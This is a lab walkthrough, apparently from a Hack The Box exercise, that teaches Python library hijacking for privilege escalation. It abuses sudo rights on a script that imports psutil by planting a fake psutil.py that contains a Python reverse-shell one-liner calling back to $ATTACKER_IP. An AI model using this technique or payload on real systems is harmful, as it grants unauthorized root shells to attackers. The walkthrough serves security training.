### <span style="color:#50FA7B">What is Python Library Hijacking?</span>

When a Python script imports a library (like `psutil` or `pandas`), Python looks for the library in specific folders. If we can:
- Edit the original library file
- Or place a fake library in a folder Python checks first
- Or control the `PYTHONPATH` to force Python to look in a folder we control

Then we can **inject our own malicious code** and run it with **elevated privileges**.

---
### <span style="color:#50FA7B">🔍 Real-Life Scenario Summary</span>

We are given:
- A Python script `mem_status.py`
- It uses the library `psutil`
- The script has **SUID bit set** → it runs as **root**

Let’s hijack the `psutil` module and run code as root!

## <span style="color:#8BE9FD">1. Hijacking via **Writable Library File**</span>

### <span style="color:#50FA7B">🔎 Step-by-Step</span>

#### <span style="color:#FFB86C">1.(a) Check script permissions</span>
```bash
ls -l mem_status.py

# Output
# `-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py`
```
SUID is set → Runs as root  
✅ We can read and execute it

#### <span style="color:#FFB86C">1. (b) Sudo Permission:</span>
also check if we can excute the same python script with sudo permission:
```bash
sudo -l

# output
(ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
```
This means we can run this script with root permissions without any password.

#### <span style="color:#FFB86C">2. Check which library is imported</span>
```bash
# mem_status.py
import psutil
available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
```
In this case we can hijack the psutil library.
#### <span style="color:#FFB86C">3. Hijacking `psutil` library</span>
Now we create a file named `psutil` in the same folder containing Python reverse-shell code, and start a Netcat listener on the attacker machine:
```bash
echo 'import os,pty,socket;s=socket.socket();s.connect(("$ATTACKER_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' > psutil.py
```

#### <span style="color:#FFB86C">4. Run the python script with sudo permission</span>
```bash
sudo /usr/bin/python3 /home/htb-student/mem_status.py
```
Now you will have the reverse shell.
